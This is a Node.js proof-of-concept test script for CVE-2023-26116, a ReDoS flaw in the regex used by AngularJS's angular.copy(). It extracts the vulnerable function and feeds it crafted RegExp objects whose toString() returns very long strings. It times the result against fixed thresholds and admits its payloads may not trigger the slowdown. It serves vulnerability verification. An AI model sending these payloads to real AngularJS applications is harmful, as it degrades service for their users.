/**
 * CVE-2023-26116 Proof of Concept Test
 * ReDoS vulnerability in angular.copy() utility function
 *
 * Based on the vulnerability research showing that the regex /[^/]*$/ in the
 * copyType function can cause catastrophic backtracking with carefully crafted input.
 */

'use strict';

console.log('CVE-2023-26116 ReDoS Proof of Concept Test\n');

// The vulnerable function extracted from AngularJS src/Angular.js
function vulnerableCopyType(source) {
  var toString = function(obj) {
    return Object.prototype.toString.call(obj);
  };

  switch (toString.call(source)) {
    case '[object RegExp]':
      // VULNERABLE LINE: /[^/]*$/ can cause ReDoS with malicious input
      var re = new RegExp(source.source, source.toString().match(/[^/]*$/)[0]);
      re.lastIndex = source.lastIndex;
      return re;
  }
  return undefined;
}

// Create test case that demonstrates the ReDoS vulnerability
function createReDoSAttack() {
  console.log('Creating ReDoS attack payload...');

  // Create a RegExp object
  var maliciousRegex = new RegExp('test', 'g');

  // Craft a malicious toString() that will trigger the vulnerable regex
  // The pattern /[^/]*$/ will struggle with input that has many non-slash characters
  // followed by no ending delimiter, causing catastrophic backtracking

  // Attack vector 1: Long sequence of non-slash characters
  var attack1 = '/test/gimuy' + 'x'.repeat(100000);

  maliciousRegex.toString = function() {
    return attack1;
  };

  console.log('Attack payload length:', attack1.length);
  console.log('Testing ReDoS attack...');

  var startTime = process.hrtime();

  try {
    vulnerableCopyType(maliciousRegex);
    var elapsedSeconds, elapsedNanoseconds;
    [elapsedSeconds, elapsedNanoseconds] = process.hrtime(startTime);
    var elapsedMs = elapsedSeconds * 1000 + elapsedNanoseconds / 1000000;

    console.log('Processing completed in:', elapsedMs.toFixed(2), 'ms');

    if (elapsedMs > 100) {
      console.log('🚨 ReDoS vulnerability CONFIRMED!');
      console.log('Processing time indicates catastrophic backtracking');
      return true;
    } else {
      console.log('⚠️  Attack completed quickly - may need stronger payload');
      return false;
    }
  } catch (error) {
    var errorSeconds, errorNanoseconds;
    [errorSeconds, errorNanoseconds] = process.hrtime(startTime);
    var errorMs = errorSeconds * 1000 + errorNanoseconds / 1000000;
    console.log('Error occurred after:', errorMs.toFixed(2), 'ms');
    console.log('Error:', error.message);
    return false;
  }
}

// Test with angular.copy() directly if available
function testWithAngularCopy() {
  console.log('\nTesting with simulated angular.copy()...');

  // Simulate minimal angular.copy implementation
  function simulatedAngularCopy(source) {
    // Only the relevant part that triggers the vulnerability
    if (source instanceof RegExp) {
      return vulnerableCopyType(source);
    }
    return source;
  }

  // Create attack payload
  var attackRegex = new RegExp('vulnerable');

  // Different attack patterns to try
  var attackPatterns = [
    '/test/' + 'a'.repeat(10000) + 'b', // Pattern 1
    '/regex/' + 'x'.repeat(50000),      // Pattern 2
    '/pattern' + 'y'.repeat(20000) + 'z' // Pattern 3
  ];

  var vulnerabilityFound = false;

  attackPatterns.forEach(function(pattern, index) {
    console.log('\nAttack Pattern', index + 1, '- Length:', pattern.length);

    attackRegex.toString = function() {
      return pattern;
    };

    var patternStartTime = process.hrtime();

    try {
      simulatedAngularCopy(attackRegex);
      var patternSeconds, patternNanoseconds;
      [patternSeconds, patternNanoseconds] = process.hrtime(patternStartTime);
      var patternMs = patternSeconds * 1000 + patternNanoseconds / 1000000;

      console.log('Pattern', index + 1, 'processed in:', patternMs.toFixed(2), 'ms');

      if (patternMs > 50) {
        console.log('⚠️  Slow processing detected for pattern', index + 1);
        vulnerabilityFound = true;
      }
    } catch (error) {
      var errorPatternSeconds, errorPatternNanoseconds;
      [errorPatternSeconds, errorPatternNanoseconds] = process.hrtime(patternStartTime);
      var errorPatternMs = errorPatternSeconds * 1000 + errorPatternNanoseconds / 1000000;
      console.log('Pattern', index + 1, 'failed after:', errorPatternMs.toFixed(2), 'ms');
      console.log('Error:', error.message);
    }
  });

  return vulnerabilityFound;
}

// Demonstrate the actual vulnerability in the regex
function demonstrateRegexVulnerability() {
  console.log('\nDemonstrating regex vulnerability directly...');

  var vulnerableRegex = /[^/]*$/;

  // Create inputs that cause catastrophic backtracking
  var testInputs = [
    'gimuy' + 'a'.repeat(1000),
    '/flags' + 'x'.repeat(2000) + 'y',
    '/test' + 'z'.repeat(5000)
  ];

  testInputs.forEach(function(input, index) {
    console.log('\nTesting regex directly with input', index + 1, '- Length:', input.length);

    var startTime = process.hrtime();

    try {
      var match = input.match(vulnerableRegex);
      var [seconds, nanoseconds] = process.hrtime(startTime);
      var milliseconds = seconds * 1000 + nanoseconds / 1000000;

      console.log('Regex match completed in:', milliseconds.toFixed(2), 'ms');
      console.log('Match result:', match ? match[0].substring(0, 20) + '...' : 'null');

      if (milliseconds > 10) {
        console.log('⚠️  Slow regex processing detected');
        return true;
      }
    } catch (error) {
      console.log('Regex test failed:', error.message);
    }
  });

  return false;
}

// Run all tests
console.log('='.repeat(60));
var attack1 = createReDoSAttack();
var attack2 = testWithAngularCopy();
var attack3 = demonstrateRegexVulnerability();

console.log('\n' + '='.repeat(60));
console.log('CVE-2023-26116 Test Results:');
console.log('='.repeat(60));

if (attack1 || attack2 || attack3) {
  console.log('🚨 VULNERABILITY CONFIRMED: CVE-2023-26116');
  console.log('✗ angular.copy() is vulnerable to ReDoS attacks');
  console.log('✗ Vulnerable regex: /[^/]*$/ in copyType function');
  console.log('✗ Location: src/Angular.js line ~1002');
} else {
  console.log('ℹ️  Vulnerability not clearly demonstrated with current payloads');
  console.log('ℹ️  This could mean:');
  console.log('   - The vulnerability is harder to trigger than expected');
  console.log('   - The Node.js regex engine handles these patterns efficiently');
  console.log('   - More sophisticated attack payloads are needed');
}

console.log('\n📋 Vulnerability Details:');
console.log('- CVE ID: CVE-2023-26116');
console.log('- Type: Regular Expression Denial of Service (ReDoS)');
console.log('- Component: angular.copy() utility function');
console.log('- Vulnerable Code: /[^/]*$/ regex in copyType function');
console.log('- Impact: Potential DoS via catastrophic backtracking');
console.log('- Affected Versions: AngularJS >= 1.2.21');
